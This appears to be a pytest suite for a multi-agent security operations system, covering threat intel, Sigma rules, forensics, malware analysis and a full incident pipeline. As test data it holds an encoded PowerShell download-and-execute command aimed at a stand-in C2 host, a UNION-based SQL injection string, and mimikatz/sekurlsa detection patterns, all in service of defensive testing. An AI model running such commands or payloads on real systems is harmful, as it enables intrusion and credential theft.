import pytest
import asyncio
from server.soc.models import (
    SecurityEvent,
    Tier1Decision,
    IncidentContext,
    SeverityLevel,
    IncidentStatus,
    ActionRiskLevel,
    ApprovalStatus
)
from server.soc.soc_orchestrator import soc_orchestrator
from server.soc.tier1_triage import tier1_triage_agent
from server.soc.tier2_responder import tier2_responder_agent
from server.soc.tier3_hunter import tier3_hunter_agent
from server.soc.threat_intel_agent import threat_intel_agent
from server.soc.detection_engineering_agent import detection_engineering_agent
from server.soc.digital_forensics_agent import digital_forensics_agent
from server.soc.malware_analysis_agent import malware_analysis_agent
from server.soc.vulnerability_agent import vulnerability_agent
from server.soc.identity_security_agent import identity_security_agent
from server.soc.endpoint_security_agent import endpoint_security_agent
from server.soc.network_security_agent import network_security_agent
from server.soc.cloud_security_agent import cloud_security_agent
from server.soc.appsec_agent import appsec_agent
from server.soc.security_knowledge_agent import security_knowledge_agent
from server.soc.compliance_reporting_agent import compliance_reporting_agent
from server.soc.soc_guardrails import soc_guardrail_engine

@pytest.mark.asyncio
async def test_threat_intel_agent_ioc_reputation():
    # Test IP indicator
    res_ip = threat_intel_agent.analyze_indicator("185.220.101.5", "IP")
    assert res_ip.ioc == "185.220.101.5"
    assert res_ip.score >= 50

    # Test SHA256 indicator
    res_hash = threat_intel_agent.analyze_indicator("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "SHA256")
    assert res_hash.ioc_type == "SHA256"

@pytest.mark.asyncio
async def test_detection_engineering_sigma_synthesis():
    rule = detection_engineering_agent.generate_sigma_rule(
        title="Detect Mimikatz LSASS Dump",
        technique_id="T1003.001",
        tactic="Credential Access",
        process_names=["powershell.exe", "cmd.exe"],
        command_patterns=["mimikatz", "sekurlsa"],
        severity="critical"
    )
    assert rule.rule_id.startswith("SIGMA-")
    assert "powershell.exe" in rule.rule_content
    assert "attack.credential_access" in rule.rule_content

@pytest.mark.asyncio
async def test_digital_forensics_evidence_integrity():
    evidence = digital_forensics_agent.extract_evidence_artifact(
        artifact_type="PREFETCH",
        host="PROD-DB-01",
        file_path=r"C:\Windows\Prefetch\POWERSHELL.EXE.pf",
        raw_data="Forensic snapshot test payload"
    )
    assert evidence.artifact_id.startswith("EV-ART-")
    assert len(evidence.sha256_hash) == 64
    assert len(evidence.provenance_chain) == 3

@pytest.mark.asyncio
async def test_malware_analysis_entropy_and_capabilities():
    report = malware_analysis_agent.analyze_sample(
        file_name="beacon_dropper.exe",
        file_hash="a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f67890"
    )
    assert report.file_name == "beacon_dropper.exe"
    assert "VirtualAlloc" in report.suspicious_imports
    assert len(report.extracted_c2_endpoints) > 0

@pytest.mark.asyncio
async def test_vulnerability_risk_scoring():
    vuln = vulnerability_agent.evaluate_cve(
        cve_id="CVE-2023-38831",
        package="WinRAR",
        asset_criticality="critical"
    )
    assert vuln.cve_id == "CVE-2023-38831"
    assert vuln.cvss_score == 7.8
    assert vuln.business_impact_score >= 80

@pytest.mark.asyncio
async def test_identity_security_anomalies():
    anomalies = identity_security_agent.detect_identity_anomalies("admin_service_acc", events=[])
    assert len(anomalies) > 0
    assert "KERBEROASTING" in anomalies[0].anomaly_type

@pytest.mark.asyncio
async def test_network_and_cloud_security_agents():
    # Network beaconing
    conns = [{"remote_address": "185.220.101.5", "remote_port": 443}]
    net_anomalies = network_security_agent.detect_beaconing(conns)
    assert len(net_anomalies) == 1
    assert net_anomalies[0].anomaly_type == "C2_BEACONING_PERIODIC_INTERVAL"

    # Cloud IAM privilege escalation
    cloud_anomalies = cloud_security_agent.scan_cloud_resources("arn:aws:iam::123456789012:user/temp_user")
    assert len(cloud_anomalies) == 1
    assert "AdministratorAccess" in cloud_anomalies[0].remediation_cli_command

@pytest.mark.asyncio
async def test_appsec_and_knowledge_agents():
    # AppSec SQL injection detection
    app_anomaly = appsec_agent.analyze_web_payload("/api/users?id=1", "1' UNION SELECT username, password FROM users --")
    assert app_anomaly.attack_type == "SQL_INJECTION_UNION_BASED"

    # Security Knowledge Playbook
    playbook = security_knowledge_agent.retrieve_playbook("Ransomware C2 Beacon")
    assert "Ransomware" in playbook["title"]
    assert len(playbook["phases"]) >= 4

@pytest.mark.asyncio
async def test_compliance_and_reporting_agent():
    dummy_context = IncidentContext(
        case_id="CASE-TEST-COMPLIANCE",
        title="Active Kerberoasting and C2 Beaconing Incident",
        status=IncidentStatus.INVESTIGATING,
        severity=SeverityLevel.P1,
        risk_score=90,
        created_at="2026-08-26T22:00:00",
        updated_at="2026-08-26T22:05:00",
        affected_assets=[{"hostname": "PROD-DC-01", "criticality": "critical"}]
    )
    mappings = compliance_reporting_agent.map_compliance_controls(dummy_context)
    assert len(mappings) >= 4
    
    exec_summary = compliance_reporting_agent.generate_executive_summary(dummy_context)
    assert "EXECUTIVE SECURITY BRIEFING" in exec_summary

@pytest.mark.asyncio
async def test_full_soc_orchestrator_multi_agent_pipeline():
    raw_event = {
        "event_id": "EVT-TEST-BREACH-001",
        "source_type": "LIVE_EDR_PROCESS_MONITOR",
        "hostname": "CORP-DC-01",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AYgBlAGEAYwBvAG4ALgBkAGEAcgBrAG4AZQB0AC0AcgBlAGwAYQB5AC4AbwByAGcALwBhAHAAaQAvAGgAZQBhAHIAdABiAGUAYQB0ACcAKQA=",
        "user_identity": "CORP\\Administrator",
        "ip_address": "185.220.101.5"
    }

    # Execute end-to-end multi-agent SOC investigation
    context = soc_orchestrator.process_incoming_security_event(raw_event)
    assert context is not None
    assert context.risk_score >= 80
    assert context.severity in [SeverityLevel.P0, SeverityLevel.P1, SeverityLevel.P2]
    assert len(context.hypotheses) > 0
    assert len(context.containment_actions) > 0
    assert len(context.detection_rules) > 0
    assert context.explainability is not None

    # Fleet telemetry
    fleet_telemetry = soc_orchestrator.get_soc_fleet_status()
    assert fleet_telemetry["fleet_size"] == 16
